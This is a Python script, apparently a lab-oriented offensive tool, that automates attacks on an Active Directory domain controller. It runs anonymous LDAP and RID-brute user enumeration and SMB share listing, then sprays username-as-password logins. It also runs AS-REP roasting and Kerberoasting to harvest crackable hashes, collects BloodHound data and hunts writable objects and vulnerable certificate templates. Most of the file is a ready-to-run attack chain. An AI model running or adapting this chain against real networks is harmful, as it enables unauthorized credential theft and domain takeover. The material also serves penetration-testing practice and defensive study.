#!/usr/bin/env python3
import subprocess
import argparse
import os
import sys
import re
from termcolor import colored
import tempfile
import shutil
import shlex
import time

# Configuration (Defaults) 
USERNAME_DEFAULT = ""
PASSWORD_DEFAULT = ""
USERS_FILE = "users.txt"

# Centralized Status Printing 
def print_status(message):
    """Prints a status message with color only on the tag, not the whole line."""
    # Define colored tag replacements
    tag_colors = {
        "[+]": colored("[+]", "green"),
        "[-]": colored("[-]", "red"),
        "[!]": colored("[!]", "red"),
        "[!!!]": colored("[!!!]", "red"),
        "[*]": colored("[*]", "blue"),
        "[INFO]": colored("[INFO]", "blue"),
    }

    for tag, colored_tag in tag_colors.items():
        if tag in message:
            message = message.replace(tag, colored_tag)
    print(message)

def print_header(title):
    """Prints a formatted section header."""
    print(colored("\n\n\n" + "="*50, "blue"))
    print(colored(f"{title}", "white"))
    print(colored("="*50, "blue"))


def run_command(cmd_list_or_str, title, is_shell_command=False, capture_output=False):
    print(colored(f"\n\n  {title} ", "blue"))

    if isinstance(cmd_list_or_str, list):
        cmd_str = " ".join(cmd_list_or_str)
    else:
        cmd_str = cmd_list_or_str

    print(colored(f"$ {cmd_str}", "white"))

    result = subprocess.run(
        cmd_list_or_str,
        shell=is_shell_command,
        capture_output=True,
        text=True,
        check=False  # Prevent crash on failure
    )

    full_output = result.stdout + result.stderr

    def colorize_tags(line):
        """Color only tags, not the whole line."""
        tag_colors = {
            r"\[\+\]": colored("[+]", "green"),
            r"\[\-\]": colored("[-]", "red"),
            r"\[\!\]": colored("[!]", "red"),
            r"\[!!!\]": colored("[!!!]", "red"),
            r"\[\*\]": colored("[*]", "blue"),
            r"\[INFO\]": colored("[INFO]", "blue"),
        }
        for pattern, repl in tag_colors.items():
            line = re.sub(pattern, repl, line)
        return line

    for line in full_output.splitlines():
        print(colorize_tags(line))

    if capture_output:
        return full_output, result.returncode
    else:
        return None, result.returncode

# NEW FUNCTION: Check Dependencies 
def check_dependencies(is_kerberos=False):
    """Checks for necessary external tools and exits if missing."""
    print_status("\n[*] Checking external dependencies...")
    
    # Define required tools
    required_tools = {
        "nxc": "NetExec (nxc)",
        "certipy": "Certipy (ly4k/Certipy)",
        "bloodhound-ce-python": "BloodHound Python Collector (bloodhound-ce-python)",
        "bloodyAD": "bloodyAD",
    }
    
    # Impacket tools are often run as Python scripts, not just commands
    # GetNPUsers.py is required for AS-REP Roasting
    impacket_scripts = [
        "GetNPUsers.py", 
        "getTGT.py", # Used in section_2_smb_enum
        "GetUserSPNs.py", # Used in section_4_kerberoasting
    ]

    missing_tools = []

    # Check commands in PATH
    for tool, name in required_tools.items():
        if not shutil.which(tool):
            missing_tools.append(name)
    
    # Check for Impacket scripts (assuming they are in the current PATH or /usr/bin)
    for script in impacket_scripts:
        if not shutil.which(script):
            missing_tools.append(f"Impacket Script: {script}")

    if missing_tools:
        print_status("\n[!] Dependancies Missing")
        for tool in missing_tools:
            print_status(f"[-] Missing: {tool}")
        
        print_status("\n[!] Please ensure NetExec, Certipy, bloodyAD, and Impacket's Python scripts are installed and in your system's PATH.\n[!] Review https://github.com/blue-pho3nix/ade for instructions.")
        sys.exit(1)
        
    print_status("[+] All dependencies found.")
    return True

def ensure_hosts_entry(ip, fqdn, domain):
    """
    Ensures /etc/hosts maps <domain> (and fqdn) to ip.
    - If domain exists with same IP -> no change
    - If domain exists with different IP -> remove and add correct mapping
    - If domain not present -> append new mapping
    Always displays /etc/hosts afterward.
    """
    hosts_path = "/etc/hosts"
    domain_esc = re.escape(domain)

    # Read /etc/hosts (safe to read as non-root)
    try:
        with open(hosts_path, "r", encoding="utf-8") as fh:
            lines = fh.readlines()
    except Exception as e:
        print_status(f"[!] Unable to read {hosts_path}: {e}")
        return False

    # Find any existing mappings
    found_lines = []
    for ln in lines:
        stripped = ln.strip()
        if not stripped or stripped.startswith("#"):
            continue
        parts = stripped.split()
        if len(parts) >= 2:
            if domain.lower() in [p.lower() for p in parts[1:]]:
                found_lines.append((ln, parts[0]))

    modified = False

    # If any existing correct mapping found -> done
    for ln, mapped_ip in found_lines:
        if mapped_ip == ip:
            print_status(f"\n[*] Domain '{domain}' already mapped to {ip} in /etc/hosts (no change).")
            run_command("cat /etc/hosts", "Current /etc/hosts contents", is_shell_command=True)
            return False

    # If found with different IP -> remove them
    if found_lines:
        print_status(f"\n[!] Domain '{domain}' exists with different IP(s). Removing and updating mapping.")
        sed_pattern = rf"/\b{domain_esc}\b/Id"
        try:
            subprocess.run(["sudo", "sed", "-i", sed_pattern, hosts_path], check=False)
            modified = True
        except Exception as e:
            print_status(f"[!] Failed to remove old /etc/hosts entries: {e}")
            run_command("cat /etc/hosts", "Current /etc/hosts contents", is_shell_command=True)
            return False

    # Append new mapping if not already correct
    new_entry = f"{ip} {fqdn} {domain}"
    try:
        cmd = f"echo {shlex.quote(new_entry)} >> {shlex.quote(hosts_path)}"
        subprocess.run(["sudo", "sh", "-c", cmd], check=True)
        print_status(f"[+] Added new /etc/hosts entry: {new_entry}")
        modified = True
    except Exception as e:
        print_status(f"[!] Failed to append new entry: {e}")

    # Always show current /etc/hosts contents
    run_command("cat /etc/hosts", "Current /etc/hosts contents", is_shell_command=True)
    return modified


def update_users_file(new_unique, USERS_FILE, print_status_func):
    """
    Reads the existing users file, removes case-insensitive duplicates,
    merges in new_unique usernames (preserving first-seen case), and
    finally appends a lowercase version for every unique username.

    Args:
        new_unique (list): A list of case-preserved, unique usernames discovered from LDAP.
        USERS_FILE (str): The path to the file to be updated.
        print_status_func (function): The function used for logging status messages.
    """
    
    # Read existing users file and dedupe it preserving first-seen case/order
    existing_usernames = []
    seen_existing = set()
    file_exists = os.path.exists(USERS_FILE)
    file_had_dupes = False

    if file_exists:
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as ef:
                for line in ef:
                    ln = line.strip()
                    if not ln:
                        continue
                    lnl = ln.lower()
                    if lnl in seen_existing:
                        file_had_dupes = True
                        continue
                    seen_existing.add(lnl)
                    existing_usernames.append(ln)
        except Exception as e:
            print_status_func(f"[-] Warning: failed to read existing {USERS_FILE}: {e}")
            existing_usernames = []
            seen_existing = set()
            file_exists = False # Treat as non-existent on read failure

    # If the existing file had duplicates, rewrite it deduped first
    if file_had_dupes:
        try:
            with open(USERS_FILE, "w", encoding="utf-8") as ef:
                for name in existing_usernames:
                    ef.write(name + "\n")
            print_status_func(f"[+] Removed duplicates from existing {USERS_FILE} (rewrote file).")
        except Exception as e:
            print_status_func(f"[-] Warning: failed to rewrite {USERS_FILE} to remove duplicates: {e}")

    # Determine which new names to add (case-insensitive)
    to_add_originals = []
    for name in new_unique:
        if name.lower() not in seen_existing:
            to_add_originals.append(name)
            seen_existing.add(name.lower())  # mark as present so later names don't duplicate

    # Append only missing originals (if any)
    if to_add_originals:
        mode = "w" if not file_exists else "a"
        action = "Created" if not file_exists else "Appended"
        
        try:
            with open(USERS_FILE, mode, encoding="utf-8") as ef:
                for name in to_add_originals:
                    ef.write(name + "\n")
            
            print_status_func(f"[+] {action} {len(to_add_originals)} new username(s) to {USERS_FILE}.")
        except Exception as e:
            print_status_func(f"[-] Error {action.lower()} to {USERS_FILE}: {e}")
    else:
        if not file_exists:
            print_status_func(f"[*] No new usernames to write; {USERS_FILE} not created.")
        else:
            print_status_func(f"[*] {USERS_FILE} already up-to-date ({len(existing_usernames)} users). No originals added.")


    # Ensure every username has a lowercase entry (append missing lowercase lines only)
    try:
        # Re-read the file content after all original additions
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r", encoding="utf-8") as ef:
                lines = [ln.strip() for ln in ef if ln.strip()]
        else:
            # If we still don't have a file, there's nothing to lowercase
            return 

        exact_lines = set(lines)  # exact strings currently present
        
        # Dedupe case-insensitively while preserving order for finding unique names
        seen_lower = set()
        unique_by_lower = []
        for ln in lines:
            lnl = ln.lower()
            if lnl in seen_lower:
                continue
            seen_lower.add(lnl)
            unique_by_lower.append(ln)

        # Find lowercase forms missing as exact lines
        to_append = []
        for name in unique_by_lower:
            lower_name = name.lower()
            if lower_name not in exact_lines:
                to_append.append(lower_name)
                exact_lines.add(lower_name)  # mark as present for this run

        if to_append:
            with open(USERS_FILE, "a", encoding="utf-8") as ef:
                for ln in to_append:
                    ef.write(ln + "\n")
            print_status_func(f"[+] Appended {len(to_append)} lowercase name(s) to {USERS_FILE}.")
        else:
            print_status_func(f"[*] Lowercase entries already present in {USERS_FILE}. No changes made.")
            
    except Exception as e:
        print_status_func(f"[-] Error ensuring lowercase entries in {USERS_FILE}: {e}")



def section_1_ldap_discovery(r, u, p, k):
    print_header("1. LDAP Enumeration & Domain Discovery")

    discovered_domain = None
    discovered_fqdn = None

    # Step 1: Query LDAP anonymously to discover domain info 
    nxc_output, _ = run_command(
        ["nxc", "ldap", r, "-u", "''", "-p", "''"],
        "Get domain name via anonymous LDAP",
        capture_output=True
    )

    if nxc_output:
        match = re.search(r"\(name:(?P<name>[^)]+)\)\s*\(domain:(?P<domain>[^)]+)\)", nxc_output)
        if match:
            dc_name = match.group("name")
            discovered_domain = match.group("domain")
            discovered_fqdn = f"{dc_name}.{discovered_domain}"
            ensure_hosts_entry(r, discovered_fqdn, discovered_domain)
        else:
            print_status("[!] Could not parse FQDN/Domain information from LDAP output.")
    else:
        print_status("[!] No LDAP response; skipping host mapping.")

    # Step 2: Enumerate user descriptions and collect usernames 
    # AWK with internal dedupe (one-line)
    awk_script = r"""/description/{desc=substr($0,index($0,$6));valid=(desc!~/Built-in account for guest access to the computer\/domain/)} /sAMAccountName/&&valid{ if(!seen[$6]++){ printf "[+]Description: %-30s User: %s\n", desc, $6 } valid=0 }"""

    ldap_user = u if u else "''"
    ldap_pass = p if p else "''"
    auth_type = "Authenticated" if u and p else "Anonymous"

    # Enumerate with AWK (capture output)
    ldap_desc_cmd = (
        f"nxc ldap {r} -u {ldap_user} -p {ldap_pass} --query '(objectclass=user)' '' | "
        f"awk '{awk_script}'"
    )
    output, _ = run_command(
        ldap_desc_cmd,
        f"Check for linked description/sAMAccountName ({auth_type})",
        is_shell_command=True,
        capture_output=True
    )

    if not output or not output.strip():
        print_status("\n[*] No descriptions found in LDAP results.")

    # Gather usernames (sAMAccountName)
    cmd_check_users = (
        f"nxc ldap {r} -u {ldap_user} -p {ldap_pass} --query '(objectclass=user)' '' | "
        "grep sAMAccountName | awk '{{print $6}}'"
    )
    output_users, _ = run_command(
        cmd_check_users,
        f"Check for sAMAccountName ({auth_type})",
        is_shell_command=True,
        capture_output=True
    )
    
    if output_users and output_users.strip():
        # Normalize & dedupe discovered usernames (preserve first-seen case)
        raw_names = [n.strip() for n in output_users.splitlines() if n.strip()]
        seen_new = set()
        new_unique = []
        for n in raw_names:
            nl = n.lower()
            if nl in seen_new:
                continue
            seen_new.add(nl)
            new_unique.append(n)

        print_status(f"[+] Found {len(new_unique)} unique usernames from LDAP.")
        update_users_file(new_unique, USERS_FILE, print_status)

        # ALWAYS return the discovered domain/FQDN tuple (may be None, None)
        return discovered_domain, discovered_fqdn


def section_2_smb_enum(r, f, d, u, p, k):
    print_header("2. SMB Enumeration")
    
    # Authenticated Path (u and p are set) 
    if u and p:
        print_status("\n[*] Running Authenticated checks...")
        
        if k and d:
            auth_opts = ["-u", u, "-p", p] 
        elif u and p:
            # Standard NTLM authentication (initial run or when k is False).
            auth_opts = ["-u", u, "-p", p]
        else:
            auth_opts = []
        
        # Kerberos Ticket/Connection Logic (for the second run)
        if k and f and d:
            ccache_file = f"{u}.ccache"

            # NXC Kerberos Share Enumeration (using FQDN)
            run_command(["nxc", "smb", f, "-u", u, "-p", p, "-k", "--shares"], "Enumerate SMB shares (Kerberos with nxc)")

            # Get Kerberos TGT (This tool requires the password, but FQDN positional argument is REMOVED)
            run_command(["getTGT.py", f"{d}/{u}:{p}", "-dc-ip", r], "Get Kerberos TGT with getTGT.py")

            # Give smbclient.py command to run
            if os.path.exists(ccache_file):
                cmd_str = f"KRB5CCNAME={ccache_file} smbclient.py -k {f}/"
                
                print(colored(f"\n Connect to SMB using Kerberos ticket ", 'blue'))
                print_status(f"[+] EXECUTABLE COMMAND: {cmd_str}")
                print_status("[*] Note: You will need to run this command manually in a new shell where the ticket is available.")
            else:
                print_status(f"[-] ERROR: Kerberos ticket file '{ccache_file}' not found after getTGT.py.")
            
            if not os.path.exists(USERS_FILE):
                run_command(["nxc", "smb", f, "-u", u, "-p", p, "-k", "--rid-brute", "5000", "--users-export", USERS_FILE], "RID Brute-Force to create user list (Anonymous)")
            else:
                print_status(f"\n[*] User file '{USERS_FILE}' already exists, skipping initial RID brute-force.")
        else:
            # NTLM/Kerberos Authenticated Checks (Uses IP address)
            run_command(["nxc", "smb", r] + auth_opts + ["--shares"], "Enumerate SMB shares (Authenticated)")
            if not os.path.exists(USERS_FILE):
                run_command(["nxc", "smb", r, "-u", u, "-p", p, "--rid-brute", "5000", "--users-export", USERS_FILE], "RID Brute-Force to create user list (Anonymous)")
            else:
                print_status(f"\n[*] User file '{USERS_FILE}' already exists, skipping initial RID brute-force.")
            #

    # Anonymous/Guest Path (ONLY runs if NO credentials were provided) 
    else:
        print_status("\n[*] Running initial Anonymous/Guest checks...")

        # Anonymous Shares
        run_command(["nxc", "smb", r, "-u", "''", "-p", "''", "--shares"],"Enumerate SMB shares (Anonymous)")

        # Guest Shares
        run_command(["nxc", "smb", r, "-u", "'guest'", "-p", "''", "--shares"], "Enumerate SMB shares (Guest)")
        # RID Brute-Force to create user list (Only if user file doesn't exist) 
        if not os.path.exists(USERS_FILE):
            run_command(["nxc", "smb", r, "-u", "''", "-p", "''", "--rid-brute", "5000", "--users-export", USERS_FILE], "RID Brute-Force to create user list (Anonymous)")
            run_command(["nxc", "smb", r, "-u", "guest", "-p", "''", "--rid-brute", "5000", "--users-export", USERS_FILE], "RID Brute-Force to create user list (Guest)")

        else:
            print_status(f"\n\n[-] User file '{USERS_FILE}' already exists, skipping initial RID brute-force.")
   


# patterns to find anywhere in an output line
_MATCH_PATTERNS = [
    re.compile(r'\[\+\]'),                       # success token anywhere
    re.compile(r'\[\-\]'),                       # failure token anywhere
    re.compile(r'STATUS_[A-Z_]+', re.IGNORECASE),# STATUS_ codes
    re.compile(r'Authenticated', re.IGNORECASE), # auth success word
    re.compile(r'Connection Error', re.IGNORECASE), # connection errors
]

def _line_matches(line: str) -> bool:
    for pat in _MATCH_PATTERNS:
        if pat.search(line):
            return True
    return False

def try_user_user_file(file_path, target, note="Try user:user", timeout=30):
    """
    Silent user:user spray that prints progress + exact result lines.
    Accepts `note` so callers can pass explanatory text (e.g. "Attempt user:user").

    Output style:
      [*] Starting user:user spray (Checking users.txt)...
      $ nxc smb 10.129.234.71 -u <user> -p <user> --continue-on-success
      [-] baby.vl\\Guest:Guest STATUS_LOGON_FAILURE
      ...
      [+] baby.vl\\Joseph.Hughes:Joseph.Hughes Authenticated!
    """
    if not os.path.exists(file_path):
        print_status(f"\n\n[INFO] Username file '{file_path}' not found; skipping {note}.")
        return

    print_status(f"\n\n[*] Starting {note} (Checking {file_path})...")
    print(colored(f"$ nxc smb {target} -u <user> -p <user> --continue-on-success", "white"))

    with open(file_path, "r", encoding="utf-8") as fh:
        for raw in fh:
            user = raw.strip()
            if not user:
                continue

            cmd = ["nxc", "smb", target, "-u", user, "-p", user, "--continue-on-success"]
            try:
                proc = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    timeout=timeout,
                )
                output = proc.stdout or ""
            except subprocess.TimeoutExpired:
                print_status(f"[-] {user}:{user} -> timeout after {timeout}s")
                continue
            except Exception as e:
                print_status(f"[-] {user}:{user} -> exception: {e}")
                continue

            # print any line that matches our patterns (print the line exactly)
            for line in output.splitlines():
                if line and _line_matches(line):
                    print_status(line)

    print_status("\n[+] User:user spray finished.")


def section_3_user_spraying(r, d, u=None, p=None):
    """
    User Spraying (AS-REP Roasting)
    - If no credentials provided (u and p are both empty/None), run user:user spraying.
    - If credentials provided, skip spraying but still run GetNPUsers.py if users.txt exists.
    """
    print_header("3. User Spraying (AS-REP Roasting)")

    # If credentials provided, skip spraying loops but still run AS-REP if possible
    if u and p:
        print_status("\n[INFO] Credentials provided — skipping user:user spraying")
        if os.path.exists(USERS_FILE):
            cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
            run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
        else:
            print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
        return

    # No creds -> proceed with spraying (but only if users.txt exists)
    if not os.path.exists(USERS_FILE):
        print_status(f"\n[INFO] Username file '{USERS_FILE}' not present — cannot spray.")
        return

    # Run AS-REP roast check with GetNPUsers.py (preserve existing behavior)
    if os.path.exists(USERS_FILE):
        cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
        run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
    else:
        print_status(f"\n[INFO] '{USERS_FILE}' not found - skipping AS-REP Roasting.")

    # Try users in ofrom users.txt
    try_user_user_file(USERS_FILE, r, note="Attempt user:user")

def section_4_kerberoasting(r, f, d, u, p, k):
    """Runs Kerberoasting and returns True if NTLM fails and Kerberos is needed."""
    print_header("4. Find SPNs (Kerberoasting)")

    kerberos_auth = ["-k"] if k else []
    dc_host_name = f

    base_cmd = ["GetUserSPNs.py", f"{d}/{u}:{p}", "-request", "-dc-host", dc_host_name] + kerberos_auth

    # Run the command and capture ALL output (stdout + stderr)
    output, _ = run_command(base_cmd, "Request TGS for service accounts", capture_output=True)

    NTLM_FAILED = "NTLM negotiation failed"
    INVALID_CREDENTIALS = "invalidCredentials"

    if output and (NTLM_FAILED in output or INVALID_CREDENTIALS in output):
        if not k:
            print_status("\n[!] KERBEROS RERUN DETECTED: NTLM negotiation failed.")
            print_status("      Switching entire script to Kerberos authentication for second pass.")
            return True
    return False


def section_5_bloodhound(r, f, d, u, p, k):
    print_header("5. Collect BloodHound Data")

    kerberos_auth = ["-k"] if k else []
    
    # NEW: Introduce a retry loop
    max_retries = 2 # 1 initial attempt + 1 retry
    current_attempt = 1
    
    while current_attempt <= max_retries:
        print_status(f"[*] Running BloodHound collector (Attempt {current_attempt}/{max_retries})...")
        
        _, return_code = run_command(
            [
                "bloodhound-ce-python",
                "-d", d,
                "-u", u,
                "-p", p,
                "-dc", f,   
                "-ns", r,
                "--dns-timeout", "10",
                "-c", "all",
                "-op", u,
                *kerberos_auth,
                "--zip"
            ],
            "Run BloodHound collector",
            capture_output=True 
        )

        if return_code == 0:
            print_status("\n[+] BloodHound collector finished successfully.")
            return # Exit the function on success
        
        # If it failed, check if we have more retries
        current_attempt += 1
        if current_attempt <= max_retries:
            print_status("[-] BloodHound collector failed. Retrying in 5 seconds...")
            import time
            time.sleep(5)
        
    # If the loop finishes without returning, all attempts failed
    print_status("\n[!!!] BLOODHOUND FAILURE DETECTED [!!!]")
    print_status(f"[-] All {max_retries} attempts failed.")
    print_status("[-] Check the output above for reasons like invalid credentials, DNS failure, or network block.")


def section_6_bloodyad(r, u, p, k, d, f):
    print_header("6. Check Permissions (bloodyAD)")

    # Define the Kerberos flag string to be added ONLY if 'k' is True
    kerberos_auth = "-k" if k else ""

    # Construct command, using FQDN (f) as the host for Kerberos and DC IP (r) for the DC-IP.
    # Note: bloodyAD often requires FQDN for the host argument when using Kerberos.
    cmd = f"bloodyAD -u {u} -p {p} {kerberos_auth} -d {d} --dc-ip {r} --host {f} get writable ".strip()

    run_command(cmd, "Check for writable objects with bloodyAD", is_shell_command=True)

def section_7_adcs_certipy(r, f, d, u, p, k):
    print_header("7. ADCS Enumeration (Certipy)")

    auth_opts = ["-u", u, "-p", p]
    kerberos_flag_list = ["-k"] if k else []

    # NXC Check (Code unchanged)
    run_command(["nxc", "ldap", r] + auth_opts + kerberos_flag_list + ["-M", "adcs"], "Check for ADCS with nxc")

    # Certipy Find
    if k:
        # Kerberos Auth for Certipy
        certipy_cmd = ["certipy", "find", "-target", f, "-u", f"{u}@{d}", "-p", p, "-k", "-dc-ip", r, "-vulnerable", "-stdout","-ldap-scheme", "ldap"]
        run_command(certipy_cmd, "Find vulnerable cert templates (Kerberos)")
    else:
        # NTLM Auth for Certipy (Also add -no-tls for consistency)
        certipy_cmd = ["certipy", "find", "-u", u, "-p", p, "-dc-ip", r, "-vulnerable", "-stdout", "-ldap-scheme", "ldap"]
        run_command(certipy_cmd, "Find vulnerable cert templates (NTLM)")


def section_8_adcs_pfx_scan(r, u, pfx_cert, pfx_pass):
    print_header("8. Advanced ADCS Scan (with PFX certificate)")
    run_command(["nxc", "ldap", r, "--pfx-cert", pfx_cert, "--pfx-pass", pfx_pass, "-u", u, "-M", "adcs"], "Scan ADCS using PFX certificate")


def main():
    parser = argparse.ArgumentParser(
        description="Automated Active Directory Enumeration Script for Educational/Lab Use.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Example Usage:
 Basic: python ad_enum_script_v4.py -r 10.10.10.161
 Auth:  python ad_enum_script_v4.py -r 10.10.10.161 -u 'user' -p 'pass'
 Cert:  python ad_enum_script_v4.py -r 10.10.10.161 -u 'user' --pfx-cert user.pfx --pfx-pass 'password'
"""
    )
    # Core arguments
    parser.add_argument("-r", "--rhosts", help="Target DC IP Address (Required).", required=True)
    parser.add_argument("-d", "--domain", help="Domain name (e.g., CORP.LOCAL). Needed for most checks.")
    parser.add_argument("-f", "--fqdn", help="Fully Qualified Domain Name of DC (e.g., dc01.corp.local). Needed for Kerberos and Certipy.")
    # Standard credentials
    parser.add_argument("-u", "--username", default=USERNAME_DEFAULT, help="Username for authenticated scans.")
    parser.add_argument("-p", "--password", default=PASSWORD_DEFAULT, help="Password for authenticated scans.")

    # Certificate credentials
    parser.add_argument("--pfx-cert", help="Path to PFX certificate for ADCS scan.")
    parser.add_argument("--pfx-pass", help="Password for the PFX certificate.") 

    args = parser.parse_args()

    args.kerberos = False

    # Rerun Loop Setup 
    run_authenticated_checks = True

    while run_authenticated_checks:

        ascii_art = r"""                        
                                                        
         .8.          8 888888888o.      8 8888888888   
        .888.         8 8888    `^888.   8 8888         
       :88888.        8 8888        `88. 8 8888         
      . `88888.       8 8888         `88 8 8888         
     .8. `88888.      8 8888          88 8 888888888888 
    .8`8. `88888.     8 8888          88 8 8888         
   .8' `8. `88888.    8 8888         ,88 8 8888         
  .8'   `8. `88888.   8 8888        ,88' 8 8888         
 .888888888. `88888.  8 8888    ,o88P'   8 8888         
.8'       `8. `88888. 8 888888888P'      8 888888888888 
                 
                            by Ｂｌｕｅ  Ｐｈｏ３ｎｉｘ                                      
        """

        # Print the colored ASCII Art
        print(colored("\n" + ascii_art, "magenta")) # You can change "green" to any color
        print(colored(f"\n[CONFIG] Target IP:", "blue") + colored(f" {args.rhosts}", "white"))
        print(colored(f"[CONFIG] Domain:", "blue") + colored(f"    {args.domain or 'Not Provided'}", "white"))
        print(colored(f"[CONFIG] FQDN:", "blue") + colored(f"      {args.fqdn or 'Not Provided'}", "white"))
        print(colored(f"[CONFIG] User:", "blue") + colored(f"      {args.username or 'Anonymous/Guest'}", "white"))
        print(colored(f"[CONFIG] Password:", "blue") + colored(f"      {args.password or 'Not Provided'}", "white"))
        print(colored(f"[CONFIG] Kerberos:", "blue") + colored(f"  {'Enabled' if args.kerberos else 'Disabled'}", "white"))

        run_authenticated_checks = False
        
        check_dependencies()

        # A. PFX Certificate Scan (Priority Check) 
        if args.pfx_cert:
            if args.username and args.pfx_pass:
                section_8_adcs_pfx_scan(args.rhosts, args.username, args.pfx_cert, args.pfx_pass)
            else:
                print_status("\n[!] PFX scan requires a username (--username) and PFX password (--pfx-pass).")
            break

        # B. LDAP Discovery (Always Runs) 
        discovered_domain, discovered_fqdn = section_1_ldap_discovery(
            args.rhosts, args.username, args.password, args.kerberos
        )

        # Update the configuration variables for subsequent steps
        if discovered_domain: args.domain = discovered_domain
        if discovered_fqdn: args.fqdn = discovered_fqdn

        section_2_smb_enum(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)

        if args.domain:
            section_3_user_spraying(args.rhosts, args.domain, args.username, args.password)
        else:
            print_status("\n[!] Skipping User Spraying (AS-REP Roasting), as it requires domain discovery.")

        # C. Authenticated Checks (The Rerun Block) 
        if not args.username or not args.password:
            print_status("\n[INFO] No credentials provided. Skipping authenticated checks.")

        elif not args.domain or not args.fqdn:
            print_status("\n[!] Skipping advanced authenticated checks, as they require discovered domain and fqdn.")

        else:
            # Kerberoasting (Check for NTLM failure here) 
            rerun_kerberos = section_4_kerberoasting(
                args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos
            )

            if rerun_kerberos and not args.kerberos:
                # Rerun Logic Triggered
                print_status("\n[!] NTLM negotiation failed. Switching to Kerberos for all subsequent commands.")
                args.kerberos = True
                run_authenticated_checks = True
                print_status("[!] Restarting Enumeration with Kerberos Enabled")
                continue

            # Only continue with these sections if NOT rerunning 
            section_5_bloodhound(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
            section_6_bloodyad(args.rhosts, args.username, args.password, args.kerberos, args.domain, args.fqdn)
            section_7_adcs_certipy(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)

    print_status("\n[+] Enumeration script finished.\n")

if __name__ == "__main__":
    main()
